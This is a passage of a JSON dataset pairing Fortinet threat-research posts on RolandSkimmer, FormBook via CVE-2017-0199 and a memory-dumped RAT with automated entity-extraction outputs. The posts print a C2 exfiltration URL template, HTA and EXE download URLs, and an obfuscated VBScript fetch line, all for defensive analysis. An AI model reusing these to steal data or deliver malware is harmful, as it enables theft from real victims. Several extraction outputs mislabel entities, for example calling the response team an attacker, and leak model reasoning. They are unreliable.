hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions. The script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—<imaage> instead of a valid <img> or <image> tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js. The background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.The retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.” The malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5). After detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden <a> elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft. Once the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number): hxxps://bg3dsec[.]com/<randomized str>?S=<useridentifier>-<site>&D=<captured form data>?&N=<credit card number> Attackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS). The critical component of this attack lies in the maliciously crafted LNK file with the following arguments: --load-extension=”%LOCALAPPDATA%\\s2ch97” ----mark-non-secure-as=disabled. The LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment. The attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.” These decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation. By leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled. Once all the browsers’ related settings are complete, mshta.exe is killed. Upon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented. These logs included status messages such as: These logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly. “RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information. The attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity. The malware described in this report are detected and blocked byFortiGuard Antivirusas: LNK/Agent.96F1!trJS/Agent.SOM!trVBS/Agent.ABUE!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. invsetmx[.]comfzhivka-001-site1[.]btempurl[.]comexmkleo[.]combg3dsec[.]comzzigi20-001-site1.atempurl.comtopclima-001-site1.itempurl.comrinootracebg-001-site1.etempurl.commgproperties-001-site1.itempurl.comkleoti-001-site1.htempurl.com 80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d 86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f17086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0 4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2cd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53c02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb45810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Threat Type), (Microsoft Windows, Platform), (Bulgaria, Location), (RolandSkimmer, Threat Type), (Rol@and4You, String), (faktura_3716804.zip, File), (faktura_1065170.lnk, File), (C:\\WiNDOws\\SYsTEM32\\MShTA.exe, File), (Hxxp://iNVsetmX[.]cOM/ipa.AsPX, URL), (Microsoft Windows, Platform), (2025 Global Threat Landscape Report, Document), (SeT mi1=CReATeobjECt(\\\"msxmL2.SErverXMlHTtp.6.0\\\"):mi1.OpEN \\\"geT\\\",\\\"Hxxp://iNVsetmX[.]cOM/ipa.AsPX\\\",faLSe:mi1.SEnD():rANdOMize, Code)\nRelationships: (FortiGuard Labs Threat Research, associated with, RolandSkimmer), (RolandSkimmer, targets, Bulgaria), (RolandSkimmer, uses, faktura_3716804.zip), (faktura_3716804.zip, drop, faktura_1065170.lnk), (faktura_106517",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Threat Type"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Bulgaria",
          "Location"
        ],
        [
          "RolandSkimmer",
          "Threat Type"
        ],
        [
          "Rol@and4You",
          "String"
        ],
        [
          "faktura_3716804.zip",
          "File"
        ],
        [
          "faktura_1065170.lnk",
          "File"
        ],
        [
          "C:\\WiNDOws\\SYsTEM32\\MShTA.exe",
          "File"
        ],
        [
          "Hxxp://iNVsetmX[.]cOM/ipa.AsPX",
          "URL"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "associated with",
          "RolandSkimmer"
        ],
        [
          "RolandSkimmer",
          "targets",
          "Bulgaria"
        ],
        [
          "RolandSkimmer",
          "uses",
          "faktura_3716804.zip"
        ],
        [
          "faktura_3716804.zip",
          "drop",
          "faktura_1065170.lnk"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 4,
    "model": "Qwen3 4B",
    "index": 11
  },
  {
    "title": "How a Malicious Excel File (CVE-2017-0199) Delivers the FormBook Payload",
    "link": "https://www.fortinet.com/blog/threat-research/how-a-malicious-excel-file-cve-2017-0199-delivers-the-formbook-payload",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Control and Collect Sensitive Information from a Victim’s DeviceSeverity level:Critical FortiGuard Labs recently observed a high-severity phishing campaign targeting old version Office Application users through malicious email attachments. The emails deliver an Excel file designed to exploit theCVE-2017-0199vulnerability, a known flaw in old version Microsoft Office's OLE (Object Linking and Embedding) functionality. The malware being spread in this campaign is FormBook, an information-stealing malware known for its ability to capture sensitive data, including login credentials, keystrokes, and clipboard information. Upon opening the malicious Excel file, the malware performs a series of operations, ultimately running the FormBook payload. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The phishing campaign starts with an email disguised as a sales order urging the recipient to open an attached Excel document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. CVE-2017-0199 is a logic vulnerability found in older versions of the Office Application (Office 2007/2010 /2013 /2016). When a user opens the attached Office document targeting this vulnerability, the program sends an HTTP request to a remote server to retrieve a malicious HTA file. The program then uses COM objects to find the application/HTA file handler, which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious script. Figure 2 shows how CVE-2017-0199 works: We opened the Office document from the email attachment using a compression program, which allowed us to directly view the OLE object content, as shown in Figure 3. If we had opened the Office document within a vulnerable version of Office, it would have triggered CVE-2017-0199, causing the download and execution of the linked content. As you can see, this is a very long URL. However, when accessing it normally, we don't need to pay attention to the content between the protocol and the '@' symbol. This allows us to obtain the actual URL we need. (hxxps[:]//agr[.]my/P6bJNr) Figure 4 shows the discovery of the shortened URL. When this link is accessed, it triggers a 302 redirect that jumps to the actual destination address. If you would like to learn this vulnerability in greater depth, this article provides a more thorough analysis:An Inside Look at CVE-2017-0199 – HTA and Scriptlet File Handler Vulnerability CVE-2017-0199 is a vulnerability dating back eight years, for which official patches have already been released. Nevertheless, due to the inherent challenges of vulnerability management and remediation—encompassing outdated software systems, overburdened IT teams, organizational negligence, or technical incompetence—organizations that fail to promptly update their systems, apply patches inconsistently, or implement security measures carelessly remain susceptible to exploitation of this vulnerability. We can see that the downloaded script is an HTA file (Figure 5), with its main execution logic being a segment of base64-encoded content. After decoding the base64 content, we found that its core functionality is to download a new file, place it in the %APPDATA% directory, and then execute it. (Figure 6) By analyzing sections of the obtained sample, we observed that its .rsrc section contains an unformatted resource data entry named “SCRIPT,” as shown in Figure 7. Examining its content revealed that it begins with the byte sequence “A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D”, which is characteristic of executable files generated by Aut2Exe from AutoIt scripts. Using a debugger for dynamic analysis, we attempted to examine how the sample decrypts the content of the SCRIPT resource and executes the payload, as shown in Figure 8. After initially reading and verifying the \"SCRIPT\" resource, the sample uses the IsDebuggerPresent API for anti-debugging measures, as shown in Figure 9. If it detects that the program is being debugged, it will only output, \"This is a third-party compiled AutoIt script.\" Afterwards, the sample reads the \"SCRIPT\" resource again and decrypts its contents, as shown in Figure 10. After thorough analysis, we discovered that the script decodes the encoded content using 0x1Em and extracts a file called “springmaker” from itself to the %TEMP% directory. It then calls CallWindowProc to run the decoded content, as shown in Figure 11. By examining the content of the “springmaker” file and decompiling what CallWindowProc executes, we discovered that the “springmaker” file is XORed with the string “3NQXSHDTVT2DPK06”, as shown in Figure 12. By applying the same XOR operation using that same string, we can restore the original file. At this point, we have finally obtained the core payload, which is the FormBook malware, as shown in Figure 13. If you would like to learn more about FormBook, here is a recent analysis:Infostealer Malware FormBook Spread via Phishing Campaign – Part II This is a serious phishing campaign targeting Windows users. The attackers send emails with malicious Excel attachments that exploit the CVE-2017-0199 vulnerability to deploy the FormBook malware. The attack process involves distributing malicious Excel files through phishing emails and exploiting CVE-2017-0199 to download and execute malicious HTA files. The HTA file downloads and executes \"sihost.exe,\" which in turn extracts \"springmaker.\" Finally, the \"springmaker\" file is decoded into the FormBook malware. The entire process is shown in Figure 14. This attack aims to take control of victims' devices and steal sensitive information, posing a significant threat. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS servicedetects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus service detects the malicious Excel document, the HTA file, the malicious sihost.exe file as well as the decrypted FormBook with the following AV signatures. MSExcel/CVE_2017_0199.G1!exploitVBS/Obfuscated.AO!trAutoIt/Injector.GKX!trW32/Formbook.AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the free NSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp[:]//172[.]245[.]123[.]32/xampp/hh/wef[.]htahxxp[:]//172[.]245[.]123[.]32/199/sihost[.]exe [AprilSAO2025.xls]33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427 [wef.hta]2BFBF6792CA46219259424EFBBBEE09DDBE6AE8FD9426C50AA0326A530AC5B14 [siHOST.exe]7E16ED31277C31C0370B391A1FC73F77D7F0CD13CC3BAB0EAA9E2F303B6019AF [springmaker]A619B1057BCCB69C4D00366F62EBD6E969935CCA65FA40FDBFE1B95E36BA605D [FormBook / Decrypted springmaker]3843F96588773E2E463A4DA492C875B3241A4842D0C087A19C948E2BE0898364 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Microsoft Windows, Platform), (Windows Users, Group), (CVE-2017-0199, Vulnerability), (FormBook, Malware), (FortiMail, Tool), (2025 Global Threat Landscape Report, Document), (Office Application, Tool)\nRelationships: (FortiGuard Labs, observed, FormBook), (FormBook, exploits, CVE-2017-0199), (FormBook, targets, Windows Users), (FormBook, uses, FortiMail), (FormBook, associated with, 2025 Global Threat Landscape Report), (FormBook, associated with, Office Application)\nAnswer:\n\nNamed Entities: (FortiGuard Labs, Organization), (Microsoft Windows, Platform), (Windows Users, Group), (CVE-2017-0199, Vulnerability), (FormBook, Malware), (FortiMail, Tool), (2025 Global Threat Landscape Report, Document), (Office Application, Tool)\nRelationships: (FortiGuard Labs, observed, FormBook), (FormBook, exploits, CVE-2017-0199), (FormBook, targets, Windows Users), (FormBook, uses, FortiMail), (FormBook, associated with, 2025 Global Threat Landscape Report), (FormBook, associated with, Office Application",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Windows Users",
          "Group"
        ],
        [
          "CVE-2017-0199",
          "Vulnerability"
        ],
        [
          "FormBook",
          "Malware"
        ],
        [
          "FortiMail",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "Office Application",
          "Tool"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Windows Users",
          "Group"
        ],
        [
          "CVE-2017-0199",
          "Vulnerability"
        ],
        [
          "FormBook",
          "Malware"
        ],
        [
          "FortiMail",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "Office Application",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "observed",
          "FormBook"
        ],
        [
          "FormBook",
          "exploits",
          "CVE-2017-0199"
        ],
        [
          "FormBook",
          "targets",
          "Windows Users"
        ],
        [
          "FormBook",
          "uses",
          "FortiMail"
        ],
        [
          "FormBook",
          "associated with",
          "2025 Global Threat Landscape Report"
        ],
        [
          "FormBook",
          "associated with",
          "Office Application"
        ],
        [
          "FortiGuard Labs",
          "observed",
          "FormBook"
        ],
        [
          "FormBook",
          "exploits",
          "CVE-2017-0199"
        ],
        [
          "FormBook",
          "targets",
          "Windows Users"
        ],
        [
          "FormBook",
          "uses",
          "FortiMail"
        ],
        [
          "FormBook",
          "associated with",
          "2025 Global Threat Landscape Report"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 16,
    "relationship_count": 11,
    "model": "Qwen3 4B",
    "index": 12
  },
  {
    "title": "Deep Dive into a Dumped Malware without a PE Header",
    "link": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-dumped-malware-without-a-pe-header",
    "content": "FortiGuard Labs Threat Research This analysis is part of an incident investigation led by the FortiGuard Incident Response Team. We discovered malware that had been running on a compromised machine for several weeks. The threat actor had executed a batch of scripts and PowerShell to run the malware in a Windows process. Although obtaining the original malware executable was difficult, a memory dump of the running malware process and a full memory dump of the compromised machine (the “fullout” file, size 33GB) were successfully acquired. Figure 1 provides detailed file information about the dumped memory file, “fullout,” which we scanned to build a local test environment for analyzing the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The malware was running within a dllhost.exe process with PID 8200. The dumped file is named pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp. The file name reveals that the malware was loaded and deployed in memory at address range 0x1c3eefb0000 to 0x1c3ef029fff. The dumped file is a deployed 64-bit PE (Portable Executable) file. During execution, the Windows Loader reads and parses its DOS and PE headers to load and deploy the PE file. Once deployed, these headers are no longer needed. To evade dumping the malware into a file for analysis by researchers, some malware often corrupts these header regions by overwriting them with zeros (like this one) or random data. As shown in Figure 2, both the DOS and PE headers are corrupted, making it difficult to reconstruct the entire executable from memory. To dynamically analyze the malware, we needed to replicate the compromised system’s environment locally. This required launching the dllhost.exe process in a debugger to serve as a target process for deploying the dumped malware. This would allow us to analyze the malware within a local analysis environment. Preparing the malware to execute properly in this controlled setting involves several complicated steps. The first step is to locate the entry point function (the start function), which is the initial code executed when the malware is loaded into memory by the Windows Loader. While the offset of the entry point function is typically stored in the PE header, this was not the case. Instead, we had to manually locate the entry point (the start function). Based on our experience, the first instruction of the entry function is typically compiled as “sub rsp, 28h,” but other functions may also contain this instruction. However, by dumping the malware in IDA Pro, we were able to search for all occurrences of this instruction in the IDA Pro database. Fortunately, only eight instances of the instruction appeared in the malware (Figure 3). After analysis, we confirmed that the fourth function (at 0x1C3EEFEE0A8) is the entry point. In a newly launched dllhost.exe process, we manually executed some instructions to allocate memory for deploying the dumped malware, as seen in Figure 4. It calls a relevant VirtualAlloc() API with the same base address—0x1C3EEB70000—as seen in the compromised system. Once allocated, the dumped malware was copied into the newly created memory. A PE file’s Import table lists the Windows APIs it depends on. These API loading addresses differ on different Windows systems. To run and analyze the dumped malware in the local system, these addresses needed to be relocated to the ones loaded in the local system. Figure 5 shows part of the Windows API addresses from the Import Table. Based on our analysis, the final API address can be calculated from this information. For instance, the API address at 0x1C3EF0240D0 is 0x1C3EEEE1CE0, as shown in Figure 5. It calculates the API address as 0x7FFD74224630 by executing the following ASM code at address 0x1C3EEEE1CE0h: 001C3EEEE1CE0movr10, 0E528F49552F112B4h 001C3EEEE1CEAmovr11, 0E5288B6826D35484h 001C3EEEE1CF4xorr11, r10 001C3EEEE1CF7jmpr11; 0x7FFD74224630 Using the Volatility tool, we listed the loaded modules in the dllhost.exe process (PID 8200) from the “fullout” file. As you can see in Figure 6, the API at 0x7FFD74224630 is exported from module GDI32.dll. By dumping the GDI32.dll from the “fullout” file and analyzing it, we determined that the API at address 0x7FFD74224630 corresponds to GetObjectW() in the compromised system. In our local test environment, this same API resides at address 0x07FFFF77CB870. For this API,  its original address was replaced with the local address. This malware has 257 Windows APIs requiring relocation across 16 modules, including: kernel32.dll ws2_32.dll ntdll.dll gdi32.dll shlwapi.dll sspicli.dll user32.dll shell32.dll msvcrt.dll advapi32.dll, comctl32.dll crypt32.dll gdiplus.dll ole32.dll rpcrt4.dll userenv.dll For each API in the Import Table, its original address must be replaced with its corresponding local address using the same method used for API GetObjectW(). In addition, we needed to load all the required modules that were not automatically loaded by dllhost.exe. To do this, the API LoadLibraryA() or LoadLibraryW() with the module name must be called to load them into the malware’s memory. Figure 7 shows the malware running in a debugger. The RIP register points to the entry point's address at 0x1C3EEFEE0A8. The debugger also shows some of the relocated Windows API functions at the bottom. Based on our analysis, the malware also required some global variable data located at address 0x1C3EEB7000 with a size of 0x5A000 bytes. We extracted the required global data from the “fullout” file using the Volatility tool and the dd command. We again called the VirtualAlloc() API to allocate a new memory region within the dllhost.exe process at the desired address and size. After successful allocation, the extracted data was copied into the newly allocated memory space, as shown in Figure 8. Static analysis of the malware’s entry point function reveals that the function requires three parameters. The first parameter (RCX) is the base address of the loaded malware, which in this case is 0x1C3EEFB0000. The value of the second parameter (RDX) is 0x1. The third parameter (R8) is a pointer to a 0x30-byte buffer, which can also be extracted from the “fullout” file. We prepared all three parameters accordingly and allocated additional memory to store the 30H data for the third parameter, as illustrated in Figure 9. The last critical item is the correct alignment of the RSP register. When breaking at the entry point, the lowest four bits of the RSP value must be 0x8, as shown in Figure 9. Failing to align the RSP properly can trigger an exception of EXCEPTION_ACCESS_VIOLATION (code 0xC0000005) when the malware starts. This is due to a misalignment error, particularly when executing instructions like “movdqa,” which requires 16-byte alignment. In 64-bit code mode, before calling the entry point function, the RSP’s value is 16-byte aligned (the lowest four bits are 0x0). It pushes the return address onto the stack, and the RSP value is minus eight. To correct this, we adjusted the value from 0x09CAD11D850 to 0x09CAD11D848. After multiple trials, errors, and repeated fixes, we finally managed to run the malware in the local environment. Upon execution, the malware calls a function to decrypt its C2 server domain information stored in memory. As shown in Figure 10, the decryption function is displayed along with the newly decrypted domain details, including the domain (\"rushpapers.com\") and port number (\"443\"). The malware then establishes communication with its C2 server by creating a thread. As shown in Figure 11, it prepares to invoke the CreateThread() API with the thread function at 0x1C3EEFDE300. The newly created thread is responsible for handling communication with its C2 server. Part of the thread’s code is shown on the right side of Figure 11. After launching the thread, the main thread enters a sleep state until the communication thread completes its execution. As the decrypted domain port “443” indicates, the malware communicates with the C2 server over the TLS protocol. It uses the getaddrinfo() API to obtain the domain “rushpapers.com” IP address via a DNS query. Figure 12 is a Wireshark capture of the network traffic generated by the malware as it communicates with its C2 server. Since the TLS packet is encrypted, we need to inspect the data before encryption or after decryption to view the plaintext content. This can be done by setting breakpoints in a debugger on both encryption and decryption routines used by this malware. The malware leverages two API functions, SealMessage() and DecryptMessage(), to encrypt and decrypt the data for the TLS traffic. As you can see in Figure 13, the malware is preparing to encrypt an HTTP GET request using the SealMessage() API. Below are two examples of plaintext packets--one sent and one received--: Request packet (before TLS encryption): GET /ws/ HTTP/1.1 Host: rushpapers[.]com Connection: Upgrade Upgrade: websocket Sec-WebSocket-Version: 13 Sec-WebSocket-Key: OCnq155rYct3ykkkdLrjvQ== Response packet (after TLS decryption): HTTP/1.1 101 Switching Protocols Server: nginx/1.18.0 Date: Fri, 28 Mar 2025 06:13:24 GMT Connection: upgrade Upgrade: websocket Sec-WebSocket-Accept: Bzr0K1o6RJ4bYvvm4AM5AAG172Y= These two plaintext packets are used to complete a handshake-like process. Afterward, it switchesto a custom encryption algorithm to encrypt the packet data before applying TLS encryption. Below is an example of the data that has been encrypted using the custom algorithm. 0000000082 A6 16 98 5C 75 59 CB66 55 41 F1 32 11 79 EF‚¦ ˜\\uYËfUAñ2 yï 000000102F 55 27 A8 7C 5A 36 AE68 58 74 F1 28 55 3E A9/U'¨|Z6®hXtñ(U>© 000000206C 5B 26 B6 6D 4C 26 AC69 5C 1B 92l[&¶mL&¬i\\ ’ A clearer breakdown of the data is in the table below: Offset Length Description 00 01 Magic tag.0x82 01 Variable Variable-extended-length. 0xA6 for this case. 02 04 Encryption key. 16 98 5C 75 06 26H Encrypted data. 59 CB66 … 1B 92 According to the variable-extended-length rule, the data size is calculated as 0xA6-0x80=0x26. The encryption key (such as 0x755C9816) is a randomly generated number. The custom encryption’s algorithm performs a repeated XOR operation between each byte of the key and the encrypted data bytes. As a result, the decrypted data is as follows: 000000004F 53 3A 20 57 69 6E 646F 77 73 20 31 30 20 2FOS: Windows 10 / 0000001020 36 34 2D 62 69 74 2028 31 30 2E 30 2E 31 3964-bit (10.0.19 0000002030 34 35 29 0D 0A045) The decrypted data clearly reveals the system information from our local test environment: \"OS: Windows 10 / 64-bit (10.0.19045)\\r\\n”. This information is collected and sent to the C2 server when requested by the C2 server. Below is a code snippet demonstrating the custom algorithm used to encrypt and decrypt the data. […] 001C3EF00CED3 loc_1C3EF00CED3:; CODE XREF: sub_1C3EF00CE08+FD↓j 001C3EF00CED3moveax, r9d 001C3EF00CED6andeax, 80000003h 001C3EF00CEDBjgeshort loc_1C3EF00CEE4 001C3EF00CEDDdeceax 001C3EF00CEDForeax, 0FFFFFFFCh 001C3EF00CEE2inceax 001C3EF00CEE4 001C3EF00CEE4 loc_1C3EF00CEE4:; CODE XREF: sub_1C3EF00CE08+D3↑j 001C3EF00CEE4movecx, [rbx+30h] 001C3EF00CEE7addecx, r9d 001C3EF00CEEAcdqe 001C3EF00CEECincr9d 001C3EF00CEEFmovr8b, byte ptr [rsp+rax+28h+arg_0];; the random key 001C3EF00CEF4xorr8b, [r10];;;;;;; encrypt/decrypt the data with random key. 001C3EF00CEF7incr10 001C3EF00CEFAmovrax, [rbx+20h] 001C3EF00CEFEmov[rcx+rax], r8b 001C3EF00CF02cmpr9d, edi; edi is data size 001C3EF00CF05jlshort loc_1C3EF00CED3 001C3EF00CF07 001C3EF00CF07 loc_1C3EF00CF07:; CODE XREF: sub_1C3EF00CE08+C6↑j 001C3EF00CF07add[rbx+30h], edi 001C3EF00CF0Ajmploc_1C3EF00CE55 […] Through a comprehensive analysis of its API calls and execution flow, we have confirmed this malware to be aRAT(Remote Access Trojan). This section details the malware’s capabilities for controlling the compromised system. The malware has a feature that captures the victim’s screen as JPEG images and exfiltrates them to its C2 server. It also collects the title of the current active (topmost) program to provide context about what the user is doing at the time of capture. To do this, it calls a sequence of APIs, including CreateStreamOnHGlobal(), GdiplusStartup(), GetSystemMetrics(), CreateCompatibleDC(), CreateCompatibleBitmap(), BitBlt(), GdipCreateBitmapFromHBITMAP(), GdipSaveImageToStream(), and GdipDisposeImage(). Figure 14 shows how the malware captures the screenshot by calling these APIs. The malware includes a thread function designed to act as a server, listening on a TCP port specified by the C2 server. Once activated, this function allows the malware to await incoming connections from the attacker. It implements a multi-threaded socket architecture: each time a new client (attacker) connects, the malware spawns a new thread to handle the communication. This design enables concurrent sessions and supports more complex interactions. By operating in this mode, the malware effectively turns the compromised system into a remote-access platform, allowing the attacker to launch further attacks or perform various actions on behalf of the victim. The malware can enumerate and manipulate the system services on the infected machine. It achieves this by leveraging several Windows Service Control Manager (SCM) APIs, including OpenSCManagerW(), EnumServicesStatusExW(), ControlService(), and more. This analysis successfully demonstrated the deployment and dynamic analysis of malware with corrupted DOS and PE headers in a controlled local environment. The detailed process—from preparing the malware for execution, including memory allocation and API resolution, to correcting execution parameters—ensured accurate emulation of the malware’s behavior. Our investigation into the payload revealed its sophisticated communication with the C2 server, including secure encryption and decryption mechanisms using the SealMessage() and DecryptMessage() APIs. Finally, we confirmed the malware’s significant capabilities on the compromised system, such as screen capture, remote server functionality, and manipulation of system services via Service Control Manager APIs. Fortinet protects against these attacks, and theFortiGuard IR teamis available to assist you whenever needed. Fortinet customers are already protected from this malware with FortiGuard’s AntiVirus, Web Filtering, and Anti-Botnet services  as follows: The relevant C2 server URL is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You cansign upfor future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs hxxps[:]//rushpapers[.]com/ws/ Sha256 F3EB67B8DDAC2732BB8DCC07C0B7BC307F618A0A684520A04CFC817D8D0947B9 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Threat Type), (FortiGuard Incident Response Team, Attacker), (malware, Malware), (dllhost.exe, Tool), (pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp, File), (fullout, File), (Windows Loader, Tool), (Windows, Tool), (DOS, Tool), (PE, Tool)\nRelationships: (FortiGuard Labs Threat Research, led by, FortiGuard Incident Response Team), (FortiGuard Incident Response Team, discovered, malware), (malware, executed, batch of scripts), (malware, executed, PowerShell), (malware, run, Windows process), (malware, deployed, dllhost.exe), (malware, deployed, pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp), (malware, deployed, fullout), (malware, deployed, Windows Loader), (malware, deployed, Windows), (malware, deployed, DOS), (malware, deployed, PE)\nOkay, let's tackle this. The input is a text about a malware analysis by FortiGuard Labs. First, I need to identify all the entities of the specified types.\n\nStarting with the first sentence",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Threat Type"
        ],
        [
          "FortiGuard Incident Response Team",
          "Attacker"
        ],
        [
          "malware",
          "Malware"
        ],
        [
          "dllhost.exe",
          "Tool"
        ],
        [
          "pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp",
          "File"
        ],
        [
          "fullout",
          "File"
        ],
        [
          "Windows Loader",
          "Tool"
        ],
        [
          "Windows",
          "Tool"
        ],
        [
          "DOS",
          "Tool"
        ],
        [
          "PE",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "led by",
          "FortiGuard Incident Response Team"
        ],
        [
          "FortiGuard Incident Response Team",
          "discovered",
          "malware"
        ],
        [
          "malware",
          "executed",
